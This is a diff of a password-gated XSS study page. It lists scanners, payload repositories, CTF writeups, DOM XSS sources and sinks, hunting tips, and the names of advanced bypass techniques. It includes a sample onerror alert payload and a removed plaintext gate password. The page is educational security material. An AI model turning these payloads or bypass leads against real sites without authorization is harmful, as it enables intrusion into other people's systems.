-                            <ul class="list-disc list-inside text-blue-400 space-y-1">
-                                <li><a href="https://github.com/hahwul/dalfox" target="_blank" class="hover:underline">DalFox - Parameter Analysis & XSS Scanner</a></li>
-                                <li><a href="https://github.com/s0md3v/XSStrike" target="_blank" class="hover:underline">XSStrike - Advanced XSS Detection</a></li>
-                                <li><a href="https://xsshunter.com/" target="_blank" class="hover:underline">XSS Hunter - Blind XSS Detection</a></li>
-                                <li><a href="https://github.com/KathanP19/Gxss" target="_blank" class="hover:underline">Gxss - Reflected Parameter Finder</a></li>
-                            </ul>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-3">Payload Lists</h4>
-                            <ul class="list-disc list-inside text-blue-400 space-y-1">
-                                <li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" class="hover:underline">PayloadBox - XSS Payload List</a></li>
-                                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" class="hover:underline">PayloadsAllTheThings - XSS</a></li>
-                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank" class="hover:underline">OWASP XSS Filter Evasion</a></li>
-                            </ul>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-3">Browser Extensions</h4>
-                            <ul class="list-disc list-inside text-blue-400 space-y-1">
-                                <li>Hackbar (Firefox/Chrome)</li>
-                                <li>XSS Rays</li>
-                                <li>DOM Invader (Burp Suite)</li>
-                                <li>Wappalyzer</li>
-                            </ul>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-3">Online Tools</h4>
-                            <ul class="list-disc list-inside text-blue-400 space-y-1">
-                                <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="hover:underline">PortSwigger XSS Cheat Sheet</a></li>
-                                <li><a href="https://html5sec.org/" target="_blank" class="hover:underline">HTML5 Security Cheatsheet</a></li>
-                                <li><a href="https://jsfiddle.net/" target="_blank" class="hover:underline">JSFiddle - Quick Testing</a></li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Personal Notes Section -->
-                <div class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📝 Personal Notes</h2>
-                    <div class="bg-black/30 rounded-lg p-4">
-                        <p class="text-gray-400 italic">Add your personal XSS hunting notes, findings, and discoveries here...</p>
-                        <div class="mt-4 p-3 bg-black/20 rounded border-l-4 border-yellow-400">
-                            <p class="text-yellow-400 font-semibold">💡 Tips for XSS Hunting:</p>
-                            <ul class="text-gray-300 text-sm mt-2 space-y-1">
-                                <li>• Always check reflected parameters in URL, headers, and form inputs</li>
-                                <li>• Test both GET and POST methods</li>
-                                <li>• Look for JavaScript sinks in the source code</li>
-                                <li>• Check for DOM-based XSS in client-side JavaScript</li>
-                                <li>• Don't forget about stored XSS in user profiles, comments, file uploads</li>
-                                <li>• Test CSP headers and try to find bypasses</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
+&lt;img src=x onerror=alert\`1\`&gt;</code></pre>
             </div>
         </div>
-    </div>
-</MainGridLayout>
 
-<script is:inline>
-    document.addEventListener('DOMContentLoaded', function() {
+        <!-- DOM XSS -->
+        <div id="dom-xss" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🌐 DOM XSS Sources & Sinks</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-2">Sources</h4>
+                    <code class="text-green-400 text-sm block">document.URL, location.href, location.search, location.hash, document.cookie, document.referrer, window.name, postMessage()</code>
+                </div>
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-2">Sinks</h4>
+                    <code class="text-green-400 text-sm block">innerHTML, document.write(), eval(), setTimeout(), Function(), location.href, element.src</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- CTF Platforms -->
+        <div id="ctf-platforms" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🏆 CTF Platforms & Challenges</h2>
+
+            <div class="bg-black/30 rounded-lg p-4 mb-4">
+                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 Intigriti XSS Challenges</h3>
+                <ul class="list-disc list-inside text-blue-400 space-y-2">
+                    <li><a href="https://www.intigriti.com/researchers/hackademy/xss-challenges" target="_blank" class="hover:underline">Main XSS Challenges Collection</a></li>
+                    <li><a href="https://github.com/aszx87410/ctf-writeups/issues/49" target="_blank" class="hover:underline">Intigriti 0222 XSS Challenge</a></li>
+                    <li><a href="https://github.com/aszx87410/ctf-writeups/issues/33" target="_blank" class="hover:underline">Intigriti 0421 XSS Challenge</a></li>
+                </ul>
+            </div>
+
+            <div class="bg-black/30 rounded-lg p-4 mb-4">
+                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 PortSwigger Web Security Academy</h3>
+                <ul class="list-disc list-inside text-blue-400 space-y-2">
+                    <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="hover:underline">📋 Official XSS Cheat Sheet (ESSENTIAL)</a></li>
+                    <li><a href="https://ricardojoserf.github.io/portswiggerlabs/" target="_blank" class="hover:underline">All Labs Writeups</a></li>
+                    <li><a href="https://github.com/ricardojoserf/Portswigger-Labs" target="_blank" class="hover:underline">GitHub: Portswigger Labs Repository</a></li>
+                </ul>
+            </div>
+
+            <div class="bg-black/30 rounded-lg p-4 mb-4">
+                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 Google CTF XSS Challenges</h3>
+                <ul class="list-disc list-inside text-blue-400 space-y-2">
+                    <li><a href="https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/" target="_blank" class="hover:underline">Google CTF 2024 Writeup</a></li>
+                    <li><a href="https://terjanq.github.io/google-ctf-writeups/" target="_blank" class="hover:underline">Terjanq's Google CTF Writeups</a></li>
+                    <li><a href="https://github.com/NotSurprised/XSSgame-Writeup" target="_blank" class="hover:underline">XSSgame Writeup Collection</a></li>
+                </ul>
+            </div>
+
+            <div class="bg-black/30 rounded-lg p-4 mb-4">
+                <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 HackTheBox XSS</h3>
+                <ul class="list-disc list-inside text-blue-400 space-y-2">
+                    <li><a href="https://academy.hackthebox.com/course/preview/cross-site-scripting-xss" target="_blank" class="hover:underline">📚 HTB Academy - XSS Course</a></li>
+                    <li><a href="https://academy.hackthebox.com/course/preview/advanced-xss-and-csrf-exploitation" target="_blank" class="hover:underline">📚 Advanced XSS & CSRF</a></li>
+                    <li><a href="https://snowscan.io/htb-writeup-book/" target="_blank" class="hover:underline">Book Machine Writeup</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- CTF Writeups -->
+        <div id="ctf-writeups" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📝 Individual CTF Writeups</h2>
+            <div class="bg-black/30 rounded-lg p-4 mb-4">
+                <ul class="list-disc list-inside text-blue-400 space-y-2">
+                    <li><a href="https://github.com/aszx87410/ctf-writeups" target="_blank" class="hover:underline">⭐ aszx87410's CTF Writeups (Extensive XSS)</a></li>
+                    <li><a href="https://ctftime.org/writeup/30882" target="_blank" class="hover:underline">pbctf 2021 - TBDXSS</a></li>
+                    <li><a href="https://ctftime.org/writeup/26317" target="_blank" class="hover:underline">zer0pts CTF 2021 - Simple Blog</a></li>
+                    <li><a href="https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss" target="_blank" class="hover:underline">Practical CTF XSS Guide</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Advanced Techniques -->
+        <div id="advanced-techniques" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🧪 Advanced Techniques</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-black/20 rounded p-3">
+                    <h4 class="font-bold text-red-400 mb-2">🔬 Mutation XSS (mXSS)</h4>
+                    <p class="text-gray-400 text-sm">DOMPurify bypasses, browser parsing quirks</p>
+                </div>
+                <div class="bg-black/20 rounded p-3">
+                    <h4 class="font-bold text-red-400 mb-2">🛡️ CSP Bypasses</h4>
+                    <p class="text-gray-400 text-sm">AngularJS, VueJS, CDN-based bypasses</p>
+                </div>
+                <div class="bg-black/20 rounded p-3">
+                    <h4 class="font-bold text-red-400 mb-2">🏗️ DOM Clobbering</h4>
+                    <p class="text-gray-400 text-sm">Overwriting DOM properties via HTML</p>
+                </div>
+                <div class="bg-black/20 rounded p-3">
+                    <h4 class="font-bold text-red-400 mb-2">⚡ Prototype Pollution</h4>
+                    <p class="text-gray-400 text-sm">Client-side pollution to XSS chains</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tools -->
+        <div id="tools" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛠️ Tools & Resources</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-3">Scanners</h4>
+                    <ul class="list-disc list-inside text-blue-400 space-y-1">
+                        <li><a href="https://github.com/hahwul/dalfox" target="_blank" class="hover:underline">DalFox</a></li>
+                        <li><a href="https://github.com/s0md3v/XSStrike" target="_blank" class="hover:underline">XSStrike</a></li>
+                        <li><a href="https://xsshunter.com/" target="_blank" class="hover:underline">XSS Hunter</a></li>
+                    </ul>
+                </div>
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-3">Payload Lists</h4>
+                    <ul class="list-disc list-inside text-blue-400 space-y-1">
+                        <li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" class="hover:underline">PayloadBox</a></li>
+                        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" class="hover:underline">PayloadsAllTheThings</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Personal Notes -->
+        <div class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📝 Personal Notes</h2>
+            <div class="bg-black/30 rounded-lg p-4">
+                <div class="p-3 bg-black/20 rounded border-l-4 border-yellow-400">
+                    <p class="text-yellow-400 font-semibold">💡 Tips for XSS Hunting:</p>
+                    <ul class="text-gray-300 text-sm mt-2 space-y-1">
+                        <li>• Always check reflected parameters in URL, headers, form inputs</li>
+                        <li>• Test both GET and POST methods</li>
+                        <li>• Look for JavaScript sinks in source code</li>
+                        <li>• Check for DOM-based XSS in client-side JavaScript</li>
+                        <li>• Test CSP headers and try to find bypasses</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.addEventListener('DOMContentLoaded', async function() {
         const passwordGate = document.getElementById('password-gate');
         const protectedContent = document.getElementById('protected-content');
         const passwordInput = document.getElementById('password-input');
         const unlockBtn = document.getElementById('unlock-btn');
-        const lockBtn = document.getElementById('lock-btn');
         const errorMsg = document.getElementById('error-msg');
 
-        // Check if already unlocked
-        if (sessionStorage.getItem('r3xss_unlocked') === 'true') {
+        // Check if already unlocked in this session
+        const storedHash = sessionStorage.getItem('r3xss_auth');
+        if (storedHash === VALID_HASH) {
+            showContent();
+        }
+
+        async function showContent() {
             if (passwordGate) passwordGate.classList.add('hidden');
-            if (protectedContent) protectedContent.classList.remove('hidden');
+            if (protectedContent) {
+                protectedContent.classList.remove('hidden');
+                protectedContent.innerHTML = PROTECTED_HTML;
+
+                // Add lock button functionality
+                const lockBtn = document.getElementById('lock-btn');
+                if (lockBtn) {
+                    lockBtn.addEventListener('click', function() {
+                        sessionStorage.removeItem('r3xss_auth');
+                        location.reload();
+                    });
+                }
+            }
         }
 
         if (unlockBtn) {
-            unlockBtn.addEventListener('click', function() {
+            unlockBtn.addEventListener('click', async function() {
                 const password = passwordInput ? passwordInput.value : '';
-                if (password === 'DaryxXSS_1337') {
-                    sessionStorage.setItem('r3xss_unlocked', 'true');
-                    if (passwordGate) passwordGate.classList.add('hidden');
-                    if (protectedContent) protectedContent.classList.remove('hidden');
-                    if (errorMsg) errorMsg.classList.add('hidden');
+                const hash = await hashPassword(password);
+
+                if (hash === VALID_HASH) {
+                    sessionStorage.setItem('r3xss_auth', hash);
+                    showContent();
                 } else {
                     if (errorMsg) errorMsg.classList.remove('hidden');
                     if (passwordInput) {
@@ -533,19 +382,9 @@ element.insertAdjacentHTML()</code>
 
         if (passwordInput) {
             passwordInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    if (unlockBtn) unlockBtn.click();
-                }
-            });
-        }
-
-        if (lockBtn) {
-            lockBtn.addEventListener('click', function() {
-                sessionStorage.removeItem('r3xss_unlocked');
-                if (protectedContent) protectedContent.classList.add('hidden');
-                if (passwordGate) passwordGate.classList.remove('hidden');
-                if (passwordInput) passwordInput.value = '';
+                if (e.key === 'Enter' && unlockBtn) unlockBtn.click();
             });
         }
     });
+})();
 </script>
